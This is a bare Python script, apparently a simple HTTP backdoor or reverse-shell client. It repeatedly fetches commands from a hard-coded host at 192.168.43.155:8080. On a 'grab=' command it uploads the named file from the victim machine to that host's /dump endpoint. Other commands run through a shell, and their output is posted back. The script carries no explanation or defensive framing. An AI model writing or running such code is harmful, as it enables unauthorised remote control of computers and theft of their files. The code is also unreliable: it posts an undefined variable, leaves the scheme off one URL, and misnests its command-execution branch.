import requests
import os
import subprocess
import time
while True:
	req=requests.get(url="http://192.168.43.155:8080")
	command=req.text
	if 'terminate' in command:
		break
	elif 'grab' in command:
			grab,path=command.split('=')
			if os.path.exists(path):
				url="http://192.168.43.155/dump"
				files={'file':open(path,'rb')}
				r=requests.post(url,files=file)
			else:
				post_response=requests.post(url="192.168.43.155:8080",data="[-] sorry".encode())
				CMD=subprocess.Popen(command,shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE)
				post_response=requests.post(url="http://192.168.43.155:8080",data=CMD.stdout.read())
				post_response=requests.post(url="http://192.168.43.155:8080",data=CMD.stdin.read())
				time.sleep(3)

		
